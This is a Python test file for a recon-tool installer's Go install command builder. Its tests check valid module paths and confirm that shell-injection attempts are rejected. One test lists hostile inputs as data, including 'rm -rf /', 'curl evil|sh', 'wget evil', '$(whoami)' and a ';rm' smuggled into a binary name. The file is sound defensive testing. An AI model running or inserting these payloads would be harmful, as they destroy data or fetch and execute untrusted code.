"""Phase 2 — P2-3: `go install` support for the Go-based recon arsenal.

The VPS installer accepted ONLY apt/pip, so nuclei/httpx/subfinder/katana/dnsx/
naabu/gau (all Go tools) were uninstallable despite provisioning_policy already
trusting 'go'. `_build_go_install_cmd` builds a SAFE go-install command (validated
module path, binary symlinked onto PATH); go install is arch-correct so it needs
no per-arch handling (verified on arm64).
"""
import os
import sys

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from tools.tool_manager import ToolManager  # noqa: E402

_build = ToolManager._build_go_install_cmd


def test_valid_module_builds_command_with_symlink():
    cmd = _build("github.com/projectdiscovery/httpx/cmd/httpx@latest")
    assert cmd is not None
    assert "go install github.com/projectdiscovery/httpx/cmd/httpx@latest" in cmd
    # binary is the last path element; symlinked onto a standard PATH dir.
    assert "ln -sf $HOME/go/bin/httpx /usr/local/bin/httpx" in cmd
    assert "GOBIN=$HOME/go/bin" in cmd


def test_pinned_version_is_accepted():
    cmd = _build("github.com/projectdiscovery/nuclei/v3/cmd/nuclei@v3.1.0")
    assert cmd is not None and "nuclei@v3.1.0" in cmd
    assert "/usr/local/bin/nuclei" in cmd


def test_rejects_non_module_paths():
    # no dotted host
    assert _build("justabinary@latest") is None
    # no version
    assert _build("github.com/x/y") is None
    # empty
    assert _build("") is None
    assert _build(None) is None


def test_rejects_injection_attempts():
    for evil in (
        "github.com/x/y@latest; rm -rf /",
        "github.com/x/y@latest && curl evil|sh",
        "github.com/x/y@$(whoami)",
        "github.com/x/y@latest`id`",
        "github.com/x/y@latest\nrm -rf /",
        "github.com/x/y@latest || wget evil",
    ):
        assert _build(evil) is None, f"should reject: {evil!r}"


def test_binary_name_stays_shell_safe():
    # A crafted trailing segment must not smuggle shell metachars into the symlink.
    assert _build("github.com/x/y/cmd/foo;rm@latest") is None
